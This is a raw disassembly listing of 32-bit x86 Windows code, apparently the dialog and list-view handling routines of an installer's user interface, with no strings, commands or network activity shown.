  405075:	83 f8 ff             	cmp    $0xffffffff,%eax
  405078:	0f 84 30 02 00 00    	je     0x4052ae
  40507e:	53                   	push   %ebx
  40507f:	50                   	push   %eax
  405080:	68 50 01 00 00       	push   $0x150
  405085:	ff 75 f8             	push   -0x8(%ebp)
  405088:	ff d6                	call   *%esi
  40508a:	8b f8                	mov    %eax,%edi
  40508c:	83 ff ff             	cmp    $0xffffffff,%edi
  40508f:	74 08                	je     0x405099
  405091:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405094:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  405097:	75 03                	jne    0x40509c
  405099:	6a 20                	push   $0x20
  40509b:	5f                   	pop    %edi
  40509c:	57                   	push   %edi
  40509d:	e8 f7 c1 ff ff       	call   0x401299
  4050a2:	57                   	push   %edi
  4050a3:	53                   	push   %ebx
  4050a4:	68 20 04 00 00       	push   $0x420
  4050a9:	ff 75 08             	push   0x8(%ebp)
  4050ac:	ff d6                	call   *%esi
  4050ae:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  4050b2:	89 5d 14             	mov    %ebx,0x14(%ebp)
  4050b5:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4050bc:	b8 00 02 00 00       	mov    $0x200,%eax
  4050c1:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4050c4:	75 08                	jne    0x4050ce
  4050c6:	53                   	push   %ebx
  4050c7:	53                   	push   %ebx
  4050c8:	50                   	push   %eax
  4050c9:	ff 75 fc             	push   -0x4(%ebp)
  4050cc:	ff d6                	call   *%esi
  4050ce:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4050d5:	75 32                	jne    0x405109
  4050d7:	a1 34 0d 42 00       	mov    0x420d34,%eax
  4050dc:	3b c3                	cmp    %ebx,%eax
  4050de:	74 07                	je     0x4050e7
  4050e0:	50                   	push   %eax
  4050e1:	ff 15 40 80 40 00    	call   *0x408040
  4050e7:	a1 48 0d 42 00       	mov    0x420d48,%eax
  4050ec:	3b c3                	cmp    %ebx,%eax
  4050ee:	74 07                	je     0x4050f7
  4050f0:	50                   	push   %eax
  4050f1:	ff 15 24 81 40 00    	call   *0x408124
  4050f7:	89 1d 34 0d 42 00    	mov    %ebx,0x420d34
  4050fd:	89 1d 48 0d 42 00    	mov    %ebx,0x420d48
  405103:	89 1d c0 47 42 00    	mov    %ebx,0x4247c0
  405109:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  405110:	0f 85 5a 01 00 00    	jne    0x405270
  405116:	53                   	push   %ebx
  405117:	53                   	push   %ebx
  405118:	e8 d2 c0 ff ff       	call   0x4011ef
  40511d:	8b 45 10             	mov    0x10(%ebp),%eax
  405120:	3b c3                	cmp    %ebx,%eax
  405122:	74 0e                	je     0x405132
  405124:	83 f8 ff             	cmp    $0xffffffff,%eax
  405127:	74 01                	je     0x40512a
  405129:	48                   	dec    %eax
  40512a:	50                   	push   %eax
  40512b:	6a 08                	push   $0x8
  40512d:	e8 4d fb ff ff       	call   0x404c7f
  405132:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  405135:	74 3f                	je     0x405176
  405137:	ff 35 48 0d 42 00    	push   0x420d48
  40513d:	e8 a0 c1 ff ff       	call   0x4012e2
  405142:	8b f8                	mov    %eax,%edi
  405144:	57                   	push   %edi
  405145:	e8 4f c1 ff ff       	call   0x401299
  40514a:	33 c0                	xor    %eax,%eax
  40514c:	33 c9                	xor    %ecx,%ecx
  40514e:	3b fb                	cmp    %ebx,%edi
  405150:	7e 0e                	jle    0x405160
  405152:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405155:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  405158:	74 01                	je     0x40515b
  40515a:	41                   	inc    %ecx
  40515b:	40                   	inc    %eax
  40515c:	3b c7                	cmp    %edi,%eax
  40515e:	7c f2                	jl     0x405152
  405160:	53                   	push   %ebx
  405161:	51                   	push   %ecx
  405162:	68 4e 01 00 00       	push   $0x14e
  405167:	ff 75 f8             	push   -0x8(%ebp)
  40516a:	ff d6                	call   *%esi
  40516c:	89 7d 14             	mov    %edi,0x14(%ebp)
  40516f:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  405176:	53                   	push   %ebx
  405177:	53                   	push   %ebx
  405178:	e8 72 c0 ff ff       	call   0x4011ef
  40517d:	a1 48 0d 42 00       	mov    0x420d48,%eax
  405182:	39 1d 8c 47 42 00    	cmp    %ebx,0x42478c
  405188:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40518b:	a1 88 47 42 00       	mov    0x424788,%eax
  405190:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  405197:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  40519a:	0f 8e 9c 00 00 00    	jle    0x40523c
  4051a0:	8d 78 08             	lea    0x8(%eax),%edi
  4051a3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4051a6:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4051a9:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  4051ac:	3b c3                	cmp    %ebx,%eax
  4051ae:	74 74                	je     0x405224
  4051b0:	8b 0f                	mov    (%edi),%ecx
  4051b2:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4051b5:	f6 c5 01             	test   $0x1,%ch
  4051b8:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  4051bf:	74 11                	je     0x4051d2
  4051c1:	8d 47 10             	lea    0x10(%edi),%eax
  4051c4:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  4051cb:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4051ce:	80 67 01 fe          	andb   $0xfe,0x1(%edi)
  4051d2:	f6 c1 40             	test   $0x40,%cl
  4051d5:	74 05                	je     0x4051dc
  4051d7:	6a 03                	push   $0x3
  4051d9:	58                   	pop    %eax
  4051da:	eb 0e                	jmp    0x4051ea
  4051dc:	8b c1                	mov    %ecx,%eax
  4051de:	83 e0 01             	and    $0x1,%eax
  4051e1:	40                   	inc    %eax
  4051e2:	f6 c1 10             	test   $0x10,%cl
  4051e5:	74 03                	je     0x4051ea
  4051e7:	83 c0 03             	add    $0x3,%eax
  4051ea:	8b d1                	mov    %ecx,%edx
  4051ec:	ff 75 bc             	push   -0x44(%ebp)
  4051ef:	c1 e0 0b             	shl    $0xb,%eax
  4051f2:	83 e2 08             	and    $0x8,%edx
  4051f5:	0b c2                	or     %edx,%eax
  4051f7:	8b d1                	mov    %ecx,%edx
  4051f9:	c1 f9 05             	sar    $0x5,%ecx
  4051fc:	03 c0                	add    %eax,%eax
  4051fe:	83 e2 20             	and    $0x20,%edx
  405201:	83 e1 01             	and    $0x1,%ecx
  405204:	0b c2                	or     %edx,%eax
  405206:	41                   	inc    %ecx
  405207:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40520a:	51                   	push   %ecx
  40520b:	68 02 11 00 00       	push   $0x1102
  405210:	ff 75 fc             	push   -0x4(%ebp)
  405213:	ff d6                	call   *%esi
  405215:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405218:	50                   	push   %eax
  405219:	53                   	push   %ebx
  40521a:	68 0d 11 00 00       	push   $0x110d
  40521f:	ff 75 fc             	push   -0x4(%ebp)
  405222:	ff d6                	call   *%esi
  405224:	ff 45 ec             	incl   -0x14(%ebp)
  405227:	81 c7 18 04 00 00    	add    $0x418,%edi
  40522d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405230:	3b 05 8c 47 42 00    	cmp    0x42478c,%eax
  405236:	0f 8c 67 ff ff ff    	jl     0x4051a3
  40523c:	66 83 3d 4c 47 42 00 	cmpw   $0x4,0x42474c
  405243:	04 
  405244:	75 0c                	jne    0x405252
  405246:	6a 01                	push   $0x1
  405248:	53                   	push   %ebx
  405249:	ff 75 fc             	push   -0x4(%ebp)
  40524c:	ff 15 50 82 40 00    	call   *0x408250
  405252:	a1 1c 3f 42 00       	mov    0x423f1c,%eax
  405257:	39 58 10             	cmp    %ebx,0x10(%eax)
  40525a:	74 14                	je     0x405270
  40525c:	6a 05                	push   $0x5
  40525e:	e8 6f f9 ff ff       	call   0x404bd2
  405263:	50                   	push   %eax
  405264:	6a fb                	push   $0xfffffffb
  405266:	68 ff 03 00 00       	push   $0x3ff
  40526b:	e8 4a f9 ff ff       	call   0x404bba
  405270:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  405277:	75 35                	jne    0x4052ae
  405279:	f6 05 5d 47 42 00 01 	testb  $0x1,0x42475d
  405280:	74 2c                	je     0x4052ae
  405282:	33 c0                	xor    %eax,%eax
  405284:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  405288:	8b 35 30 82 40 00    	mov    0x408230,%esi
  40528e:	0f 94 c0             	sete   %al
  405291:	c1 e0 03             	shl    $0x3,%eax
  405294:	8b f8                	mov    %eax,%edi
  405296:	57                   	push   %edi
  405297:	ff 75 fc             	push   -0x4(%ebp)
  40529a:	ff d6                	call   *%esi
  40529c:	57                   	push   %edi
  40529d:	68 fe 03 00 00       	push   $0x3fe
  4052a2:	ff 75 08             	push   0x8(%ebp)
  4052a5:	ff 15 38 82 40 00    	call   *0x408238
  4052ab:	50                   	push   %eax
  4052ac:	ff d6                	call   *%esi
  4052ae:	ff 75 14             	push   0x14(%ebp)
  4052b1:	ff 75 10             	push   0x10(%ebp)
  4052b4:	ff 75 0c             	push   0xc(%ebp)
  4052b7:	e8 57 f0 ff ff       	call   0x404313
  4052bc:	5f                   	pop    %edi
  4052bd:	5e                   	pop    %esi
  4052be:	5b                   	pop    %ebx
  4052bf:	c9                   	leave
  4052c0:	c2 10 00             	ret    $0x10
  4052c3:	55                   	push   %ebp
  4052c4:	8b ec                	mov    %esp,%ebp
  4052c6:	53                   	push   %ebx
  4052c7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4052ca:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4052d0:	57                   	push   %edi
  4052d1:	75 14                	jne    0x4052e7
  4052d3:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4052d7:	75 59                	jne    0x405332
  4052d9:	68 13 04 00 00       	push   $0x413
  4052de:	e8 15 f0 ff ff       	call   0x4042f8
  4052e3:	33 c0                	xor    %eax,%eax
  4052e5:	eb 62                	jmp    0x405349
  4052e7:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4052ed:	75 20                	jne    0x40530f
  4052ef:	ff 75 08             	push   0x8(%ebp)
  4052f2:	ff 15 74 82 40 00    	call   *0x408274
  4052f8:	85 c0                	test   %eax,%eax
  4052fa:	74 36                	je     0x405332
  4052fc:	6a 01                	push   $0x1
  4052fe:	ff 75 08             	push   0x8(%ebp)
  405301:	e8 f9 f8 ff ff       	call   0x404bff
  405306:	8b f8                	mov    %eax,%edi
  405308:	bb 19 04 00 00       	mov    $0x419,%ebx
  40530d:	eb 03                	jmp    0x405312
  40530f:	8b 7d 14             	mov    0x14(%ebp),%edi
  405312:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  405318:	75 1b                	jne    0x405335
  40531a:	39 3d 3c 0d 42 00    	cmp    %edi,0x420d3c
  405320:	74 13                	je     0x405335
  405322:	57                   	push   %edi
  405323:	6a 06                	push   $0x6
  405325:	89 3d 3c 0d 42 00    	mov    %edi,0x420d3c
  40532b:	e8 4f f9 ff ff       	call   0x404c7f
  405330:	eb 03                	jmp    0x405335
  405332:	8b 7d 14             	mov    0x14(%ebp),%edi
  405335:	57                   	push   %edi
  405336:	ff 75 10             	push   0x10(%ebp)
  405339:	53                   	push   %ebx
  40533a:	ff 75 08             	push   0x8(%ebp)
  40533d:	ff 35 44 0d 42 00    	push   0x420d44
  405343:	ff 15 90 81 40 00    	call   *0x408190
  405349:	5f                   	pop    %edi
  40534a:	5b                   	pop    %ebx
  40534b:	5d                   	pop    %ebp
  40534c:	c2 10 00             	ret    $0x10
  40534f:	55                   	push   %ebp
  405350:	8b ec                	mov    %esp,%ebp
  405352:	83 ec 30             	sub    $0x30,%esp
  405355:	a1 24 3f 42 00       	mov    0x423f24,%eax
  40535a:	53                   	push   %ebx
  40535b:	33 db                	xor    %ebx,%ebx
  40535d:	56                   	push   %esi
  40535e:	3b c3                	cmp    %ebx,%eax
  405360:	57                   	push   %edi
  405361:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405364:	0f 84 b0 00 00 00    	je     0x40541a
  40536a:	a1 14 48 42 00       	mov    0x424814,%eax
  40536f:	be 30 05 42 00       	mov    $0x420530,%esi
  405374:	8b f8                	mov    %eax,%edi
  405376:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405379:	83 e7 01             	and    $0x1,%edi
  40537c:	75 09                	jne    0x405387
  40537e:	ff 75 08             	push   0x8(%ebp)
  405381:	56                   	push   %esi
  405382:	e8 34 0f 00 00       	call   0x4062bb
  405387:	56                   	push   %esi
  405388:	e8 b1 0e 00 00       	call   0x40623e
  40538d:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405390:	89 45 08             	mov    %eax,0x8(%ebp)
  405393:	74 1b                	je     0x4053b0
  405395:	ff 75 0c             	push   0xc(%ebp)
  405398:	e8 a1 0e 00 00       	call   0x40623e
  40539d:	03 45 08             	add    0x8(%ebp),%eax
  4053a0:	3d 00 08 00 00       	cmp    $0x800,%eax
  4053a5:	73 73                	jae    0x40541a
  4053a7:	ff 75 0c             	push   0xc(%ebp)
  4053aa:	56                   	push   %esi
  4053ab:	e8 94 0e 00 00       	call   0x406244
  4053b0:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4053b4:	75 0d                	jne    0x4053c3
  4053b6:	56                   	push   %esi
  4053b7:	ff 35 08 3f 42 00    	push   0x423f08
  4053bd:	ff 15 24 82 40 00    	call   *0x408224
  4053c3:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4053c7:	75 44                	jne    0x40540d
  4053c9:	53                   	push   %ebx
  4053ca:	53                   	push   %ebx
  4053cb:	68 04 10 00 00       	push   $0x1004
  4053d0:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4053d3:	ff 75 fc             	push   -0x4(%ebp)
  4053d6:	8b 35 60 82 40 00    	mov    0x408260,%esi
  4053dc:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4053e3:	ff d6                	call   *%esi
  4053e5:	2b c7                	sub    %edi,%eax
  4053e7:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4053ea:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4053ed:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4053f0:	50                   	push   %eax
  4053f1:	b8 07 10 00 00       	mov    $0x1007,%eax
  4053f6:	2b c7                	sub    %edi,%eax
  4053f8:	53                   	push   %ebx
  4053f9:	50                   	push   %eax
  4053fa:	ff 75 fc             	push   -0x4(%ebp)
  4053fd:	ff d6                	call   *%esi
  4053ff:	53                   	push   %ebx
  405400:	ff 75 d4             	push   -0x2c(%ebp)
  405403:	68 13 10 00 00       	push   $0x1013
  405408:	ff 75 fc             	push   -0x4(%ebp)
  40540b:	ff d6                	call   *%esi
  40540d:	3b fb                	cmp    %ebx,%edi
  40540f:	74 09                	je     0x40541a
  405411:	8b 45 08             	mov    0x8(%ebp),%eax
  405414:	88 98 30 05 42 00    	mov    %bl,0x420530(%eax)
  40541a:	5f                   	pop    %edi
  40541b:	5e                   	pop    %esi
  40541c:	5b                   	pop    %ebx
  40541d:	c9                   	leave
  40541e:	c2 08 00             	ret    $0x8
  405421:	56                   	push   %esi
  405422:	8b 35 88 47 42 00    	mov    0x424788,%esi
  405428:	57                   	push   %edi
  405429:	8b 3d 8c 47 42 00    	mov    0x42478c,%edi
  40542f:	6a 00                	push   $0x0
  405431:	ff 15 88 82 40 00    	call   *0x408288
  405437:	09 05 18 48 42 00    	or     %eax,0x424818
  40543d:	6a 00                	push   $0x0
  40543f:	e8 b4 ee ff ff       	call   0x4042f8
  405444:	85 ff                	test   %edi,%edi
  405446:	74 2b                	je     0x405473
  405448:	83 c6 0c             	add    $0xc,%esi
  40544b:	4f                   	dec    %edi
  40544c:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405450:	74 0f                	je     0x405461
  405452:	ff 74 24 0c          	push   0xc(%esp)
  405456:	ff 36                	push   (%esi)
  405458:	e8 2c bf ff ff       	call   0x401389
  40545d:	85 c0                	test   %eax,%eax
  40545f:	75 0c                	jne    0x40546d
  405461:	81 c6 18 04 00 00    	add    $0x418,%esi
  405467:	85 ff                	test   %edi,%edi
  405469:	75 e0                	jne    0x40544b
  40546b:	eb 06                	jmp    0x405473
  40546d:	ff 05 ec 47 42 00    	incl   0x4247ec
  405473:	68 04 04 00 00       	push   $0x404
  405478:	e8 7b ee ff ff       	call   0x4042f8
  40547d:	ff 15 8c 82 40 00    	call   *0x40828c
  405483:	a1 ec 47 42 00       	mov    0x4247ec,%eax
  405488:	5f                   	pop    %edi
  405489:	5e                   	pop    %esi
  40548a:	c2 04 00             	ret    $0x4
  40548d:	55                   	push   %ebp
  40548e:	8b ec                	mov    %esp,%ebp
  405490:	83 ec 3c             	sub    $0x3c,%esp
  405493:	a1 24 3f 42 00       	mov    0x423f24,%eax
  405498:	53                   	push   %ebx
  405499:	56                   	push   %esi
  40549a:	57                   	push   %edi
  40549b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40549e:	33 db                	xor    %ebx,%ebx
  4054a0:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  4054a6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4054a9:	0f 85 89 01 00 00    	jne    0x405638
  4054af:	83 4d d4 ff          	orl    $0xffffffff,-0x2c(%ebp)
  4054b3:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  4054b7:	6a 02                	push   $0x2
  4054b9:	33 c0                	xor    %eax,%eax
  4054bb:	5e                   	pop    %esi
  4054bc:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  4054bf:	89 75 cc             	mov    %esi,-0x34(%ebp)
  4054c2:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4054c5:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4054c8:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  4054cb:	ab                   	stos   %eax,%es:(%edi)
  4054cc:	ab                   	stos   %eax,%es:(%edi)
  4054cd:	a1 54 47 42 00       	mov    0x424754,%eax
  4054d2:	8b 3d 38 82 40 00    	mov    0x408238,%edi
  4054d8:	68 03 04 00 00       	push   $0x403
  4054dd:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4054e0:	8b 40 60             	mov    0x60(%eax),%eax
  4054e3:	ff 75 08             	push   0x8(%ebp)
  4054e6:	89 4d 10             	mov    %ecx,0x10(%ebp)
  4054e9:	89 45 0c             	mov    %eax,0xc(%ebp)
  4054ec:	ff d7                	call   *%edi
  4054ee:	68 ee 03 00 00       	push   $0x3ee
  4054f3:	a3 10 3f 42 00       	mov    %eax,0x423f10
  4054f8:	ff 75 08             	push   0x8(%ebp)
  4054fb:	ff d7                	call   *%edi
  4054fd:	68 f8 03 00 00       	push   $0x3f8
  405502:	a3 08 3f 42 00       	mov    %eax,0x423f08
  405507:	ff 75 08             	push   0x8(%ebp)
  40550a:	ff d7                	call   *%edi
  40550c:	ff 35 10 3f 42 00    	push   0x423f10
  405512:	a3 24 3f 42 00       	mov    %eax,0x423f24
  405517:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40551a:	e8 c2 ed ff ff       	call   0x4042e1
  40551f:	6a 04                	push   $0x4
  405521:	e8 ac f6 ff ff       	call   0x404bd2
  405526:	a3 14 3f 42 00       	mov    %eax,0x423f14
  40552b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40552e:	50                   	push   %eax
  40552f:	89 1d 2c 3f 42 00    	mov    %ebx,0x423f2c
  405535:	ff 75 fc             	push   -0x4(%ebp)
  405538:	ff 15 6c 82 40 00    	call   *0x40826c
  40553e:	56                   	push   %esi
  40553f:	ff 15 a8 81 40 00    	call   *0x4081a8
  405545:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405548:	8b 35 60 82 40 00    	mov    0x408260,%esi
  40554e:	2b c8                	sub    %eax,%ecx
  405550:	8d 45 cc             	lea    -0x34(%ebp),%eax
  405553:	50                   	push   %eax
  405554:	53                   	push   %ebx
  405555:	68 1b 10 00 00       	push   $0x101b
  40555a:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40555d:	ff 75 fc             	push   -0x4(%ebp)
  405560:	ff d6                	call   *%esi
  405562:	b8 00 40 00 00       	mov    $0x4000,%eax
  405567:	50                   	push   %eax
  405568:	50                   	push   %eax
  405569:	68 36 10 00 00       	push   $0x1036
  40556e:	ff 75 fc             	push   -0x4(%ebp)
  405571:	ff d6                	call   *%esi
  405573:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  405576:	7c 1c                	jl     0x405594
  405578:	ff 75 10             	push   0x10(%ebp)
  40557b:	53                   	push   %ebx
  40557c:	68 01 10 00 00       	push   $0x1001
  405581:	ff 75 fc             	push   -0x4(%ebp)
  405584:	ff d6                	call   *%esi
  405586:	ff 75 10             	push   0x10(%ebp)
  405589:	53                   	push   %ebx
  40558a:	68 26 10 00 00       	push   $0x1026
  40558f:	ff 75 fc             	push   -0x4(%ebp)
  405592:	ff d6                	call   *%esi
  405594:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405597:	7c 0e                	jl     0x4055a7
  405599:	ff 75 0c             	push   0xc(%ebp)
  40559c:	53                   	push   %ebx
  40559d:	68 24 10 00 00       	push   $0x1024
  4055a2:	ff 75 fc             	push   -0x4(%ebp)
  4055a5:	ff d6                	call   *%esi
  4055a7:	8b 45 14             	mov    0x14(%ebp),%eax
  4055aa:	ff 70 30             	push   0x30(%eax)
  4055ad:	6a 1b                	push   $0x1b
  4055af:	ff 75 08             	push   0x8(%ebp)
  4055b2:	e8 f5 ec ff ff       	call   0x4042ac
  4055b7:	f6 05 5c 47 42 00 03 	testb  $0x3,0x42475c
  4055be:	74 34                	je     0x4055f4
  4055c0:	53                   	push   %ebx
  4055c1:	ff 35 10 3f 42 00    	push   0x423f10
  4055c7:	ff 15 30 82 40 00    	call   *0x408230
  4055cd:	f6 05 5c 47 42 00 02 	testb  $0x2,0x42475c
  4055d4:	75 0d                	jne    0x4055e3
  4055d6:	6a 08                	push   $0x8
  4055d8:	ff 75 fc             	push   -0x4(%ebp)
  4055db:	ff 15 30 82 40 00    	call   *0x408230
  4055e1:	eb 06                	jmp    0x4055e9
  4055e3:	89 1d 10 3f 42 00    	mov    %ebx,0x423f10
  4055e9:	ff 35 08 3f 42 00    	push   0x423f08
  4055ef:	e8 ed ec ff ff       	call   0x4042e1
  4055f4:	68 ec 03 00 00       	push   $0x3ec
  4055f9:	ff 75 08             	push   0x8(%ebp)
  4055fc:	ff d7                	call   *%edi
  4055fe:	68 00 00 30 75       	push   $0x75300000
  405603:	8b f8                	mov    %eax,%edi
  405605:	53                   	push   %ebx
  405606:	68 01 04 00 00       	push   $0x401
  40560b:	57                   	push   %edi
  40560c:	ff d6                	call   *%esi
  40560e:	f6 05 5c 47 42 00 04 	testb  $0x4,0x42475c
  405615:	0f 84 f3 01 00 00    	je     0x40580e
  40561b:	ff 75 0c             	push   0xc(%ebp)
  40561e:	53                   	push   %ebx
  40561f:	68 09 04 00 00       	push   $0x409
  405624:	57                   	push   %edi
  405625:	ff d6                	call   *%esi
  405627:	ff 75 10             	push   0x10(%ebp)
  40562a:	53                   	push   %ebx
  40562b:	68 01 20 00 00       	push   $0x2001
  405630:	57                   	push   %edi
  405631:	ff d6                	call   *%esi
  405633:	e9 d6 01 00 00       	jmp    0x40580e
  405638:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  40563e:	75 28                	jne    0x405668
  405640:	8d 45 0c             	lea    0xc(%ebp),%eax
  405643:	50                   	push   %eax
  405644:	53                   	push   %ebx
  405645:	68 ec 03 00 00       	push   $0x3ec
  40564a:	ff 75 08             	push   0x8(%ebp)
  40564d:	ff 15 38 82 40 00    	call   *0x408238
  405653:	50                   	push   %eax
  405654:	68 21 54 40 00       	push   $0x405421
  405659:	53                   	push   %ebx
  40565a:	53                   	push   %ebx
  40565b:	ff 15 a8 80 40 00    	call   *0x4080a8
  405661:	50                   	push   %eax
  405662:	ff 15 20 81 40 00    	call   *0x408120
  405668:	8b 35 30 82 40 00    	mov    0x408230,%esi
  40566e:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  405674:	75 20                	jne    0x405696
  405676:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  40567c:	75 39                	jne    0x4056b7
  40567e:	53                   	push   %ebx
  40567f:	ff 35 10 3f 42 00    	push   0x423f10
  405685:	ff d6                	call   *%esi
  405687:	6a 08                	push   $0x8
  405689:	ff 75 fc             	push   -0x4(%ebp)
  40568c:	ff d6                	call   *%esi
  40568e:	ff 75 fc             	push   -0x4(%ebp)
  405691:	e8 4b ec ff ff       	call   0x4042e1
  405696:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  40569c:	75 53                	jne    0x4056f1
  40569e:	39 1d 0c 3f 42 00    	cmp    %ebx,0x423f0c
  4056a4:	74 24                	je     0x4056ca
  4056a6:	6a 78                	push   $0x78
  4056a8:	c7 05 20 01 42 00 02 	movl   $0x2,0x420120
  4056af:	00 00 00 
  4056b2:	e8 ce eb ff ff       	call   0x404285
  4056b7:	ff 75 14             	push   0x14(%ebp)
  4056ba:	ff 75 10             	push   0x10(%ebp)
  4056bd:	57                   	push   %edi
  4056be:	e8 50 ec ff ff       	call   0x404313
  4056c3:	5f                   	pop    %edi
  4056c4:	5e                   	pop    %esi
  4056c5:	5b                   	pop    %ebx
  4056c6:	c9                   	leave
  4056c7:	c2 10 00             	ret    $0x10
  4056ca:	6a 08                	push   $0x8
  4056cc:	ff 35 48 47 42 00    	push   0x424748
  4056d2:	ff d6                	call   *%esi
  4056d4:	39 1d ec 47 42 00    	cmp    %ebx,0x4247ec
  4056da:	75 0e                	jne    0x4056ea
  4056dc:	a1 28 05 42 00       	mov    0x420528,%eax
  4056e1:	53                   	push   %ebx
  4056e2:	ff 70 34             	push   0x34(%eax)
  4056e5:	e8 65 fc ff ff       	call   0x40534f
  4056ea:	6a 01                	push   $0x1
  4056ec:	e8 94 eb ff ff       	call   0x404285
  4056f1:	83 ff 7b             	cmp    $0x7b,%edi
  4056f4:	75 c1                	jne    0x4056b7
  4056f6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4056f9:	39 45 10             	cmp    %eax,0x10(%ebp)
  4056fc:	75 b9                	jne    0x4056b7
  4056fe:	53                   	push   %ebx
  4056ff:	53                   	push   %ebx
  405700:	68 04 10 00 00       	push   $0x1004
  405705:	50                   	push   %eax
  405706:	ff 15 60 82 40 00    	call   *0x408260
  40570c:	3b c3                	cmp    %ebx,%eax
  40570e:	89 45 10             	mov    %eax,0x10(%ebp)
  405711:	0f 8e f7 00 00 00    	jle    0x40580e
  405717:	ff 15 ac 81 40 00    	call   *0x4081ac
  40571d:	6a e1                	push   $0xffffffe1
  40571f:	53                   	push   %ebx
  405720:	8b f0                	mov    %eax,%esi
  405722:	e8 94 0b 00 00       	call   0x4062bb
  405727:	50                   	push   %eax
  405728:	6a 01                	push   $0x1
  40572a:	53                   	push   %ebx
  40572b:	56                   	push   %esi
  40572c:	ff 15 b0 81 40 00    	call   *0x4081b0
  405732:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405735:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405739:	c1 e9 10             	shr    $0x10,%ecx
  40573c:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405740:	0f bf c9             	movswl %cx,%ecx
  405743:	75 13                	jne    0x405758
  405745:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405748:	50                   	push   %eax
  405749:	ff 75 fc             	push   -0x4(%ebp)
  40574c:	ff 15 e4 81 40 00    	call   *0x4081e4
  405752:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405755:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405758:	53                   	push   %ebx
  405759:	ff 75 08             	push   0x8(%ebp)
  40575c:	53                   	push   %ebx
  40575d:	51                   	push   %ecx
  40575e:	50                   	push   %eax
  40575f:	68 80 01 00 00       	push   $0x180
  405764:	56                   	push   %esi
  405765:	ff 15 b4 81 40 00    	call   *0x4081b4
  40576b:	83 f8 01             	cmp    $0x1,%eax
  40576e:	0f 85 9a 00 00 00    	jne    0x40580e
  405774:	8b 45 10             	mov    0x10(%ebp),%eax
  405777:	33 f6                	xor    %esi,%esi
  405779:	46                   	inc    %esi
  40577a:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40577d:	c7 45 d8 50 0d 42 00 	movl   $0x420d50,-0x28(%ebp)
  405784:	c7 45 dc 00 10 00 00 	movl   $0x1000,-0x24(%ebp)
  40578b:	89 45 08             	mov    %eax,0x8(%ebp)
  40578e:	bf 2d 10 00 00       	mov    $0x102d,%edi
  405793:	ff 4d 08             	decl   0x8(%ebp)
  405796:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  405799:	50                   	push   %eax
  40579a:	ff 75 08             	push   0x8(%ebp)
  40579d:	57                   	push   %edi
  40579e:	ff 75 fc             	push   -0x4(%ebp)
  4057a1:	ff 15 60 82 40 00    	call   *0x408260
  4057a7:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4057aa:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  4057ae:	75 e3                	jne    0x405793
  4057b0:	53                   	push   %ebx
